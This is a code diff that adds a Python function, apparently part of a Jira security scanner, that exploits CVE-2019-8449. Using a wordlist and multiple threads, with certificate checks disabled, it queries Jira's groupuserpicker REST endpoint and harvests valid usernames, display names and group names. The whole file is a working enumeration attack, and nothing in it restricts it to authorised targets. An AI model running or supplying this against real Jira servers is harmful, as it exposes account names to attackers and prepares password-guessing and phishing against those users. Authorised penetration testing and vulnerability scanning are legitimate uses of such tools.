@@ -1,0 +1,102 @@
+import requests
+import threading
+from colorama import Fore, Style
+
+def cve_2019_8449_brute(base_url, path, dict_file, num_threads=5):
+    """
+    Check for valid usernames using the /rest/api/latest/groupuserpicker endpoint.
+    Uses threading to improve performance.
+    """
+    vulnerabilities = []
+    headers = {
+        'X-Atlassian-Token': 'no-check'
+    }
+    lock = threading.Lock()  # Ensure thread-safe print
+    
+    verbose = False
+
+    def worker(username_chunk):
+        """
+        Worker function for each thread to check a chunk of usernames.
+        """
+        for count, username in enumerate(username_chunk, start=1):
+            url_to_test = f"{base_url.rstrip('/')}{path.rstrip('/')}/rest/api/latest/groupuserpicker?query={username}&maxResults=50000&showAvatar=true"
+            if verbose:
+                print(f"{Fore.BLUE}[Testing Username]{Style.RESET_ALL}: {username} on {url_to_test}")
+            try:
+                response = requests.get(url_to_test, headers=headers, allow_redirects=False, verify=False)
+                if response.status_code == 200:
+                    data = response.json()
+                    users = data.get('users', {}).get('users', [])
+                    groups = data.get('groups', {}).get('groups', [])
+
+                    for user in users:
+                        user_name = user.get("name", "Unknown Name")
+                        html = user.get("html", "No HTML Provided")
+                        display_name = user.get("displayName", "Unknown Display Name")
+
+                        vulnerabilities.append(f"+ [CVE-2019-8449 | Username Enumeration] Valid username found: {user_name}")
+                        with lock:
+                            print(f"{Fore.GREEN}+ Valid username found: {user_name}{Style.RESET_ALL}")
+                            print(f"    - HTML: {html}")
+                            print(f"    - Display Name: {display_name}")
+
+                    if groups:
+                        with lock:
+                            print(f"{Fore.CYAN}INFO: Groups matching '{username}':{Style.RESET_ALL}")
+                            for group in groups:
+                                group_name = group.get("name", "Unknown Group")
+                                vulnerabilities.append(f"+ [CVE-2019-8449 | Username Enumeration] Valid Group Name found: {group_name}")
+                                print(f"    - Group Name: {group_name}")
+                    
+                elif response.status_code == 404:
+                    # No output for not found usernames to reduce noise
+                    pass
+                elif response.status_code == 403:
+                    with lock:
+                        print(f"{Fore.YELLOW}- Forbidden (403): Cannot access username {username}{Style.RESET_ALL}")
+                elif response.status_code == 302:
+                    with lock:
+                        print(f"{Fore.YELLOW}- Redirected (302) for username {username}{Style.RESET_ALL}")
+                else:
+                    with lock:
+                        print(f"{Fore.YELLOW}- HTTP Code {response.status_code} for username: {username}{Style.RESET_ALL}")
+                
+                # Print progress every 250 usernames
+                if count % 250 == 0:
+                    with lock:
+                        print(f"{Fore.CYAN}INFO: {count} usernames tested in this chunk...{Style.RESET_ALL}")
+                        
+            except Exception as e:
+                with lock:
+                    print(f"{Fore.RED}* An error occurred while checking: {e}{Style.RESET_ALL}")
+
+    # Read usernames from the dictionary file
+    try:
+        with open(dict_file, 'r') as file:
+            usernames = [line.strip() for line in file if line.strip()]
+
+        total_usernames = len(usernames)
+        print(f"{Fore.YELLOW}INFO: Total usernames to check: {total_usernames}{Style.RESET_ALL}")
+
+        # Divide the usernames among the specified number of threads
+        chunk_size = len(usernames) // num_threads
+        threads = []
+
+        for i in range(num_threads):
+            start_index = i * chunk_size
+            end_index = (i + 1) * chunk_size if i < num_threads - 1 else len(usernames)
+            thread = threading.Thread(target=worker, args=(usernames[start_index:end_index],))
+            threads.append(thread)
+            thread.start()
+
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
+
+    except FileNotFoundError:
+        print(f"{Fore.RED}- File not found: {dict_file}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}- An error occurred while reading {dict_file}: {e}{Style.RESET_ALL}")
+
+    return vulnerabilities  # Return the discovered vulnerabilities
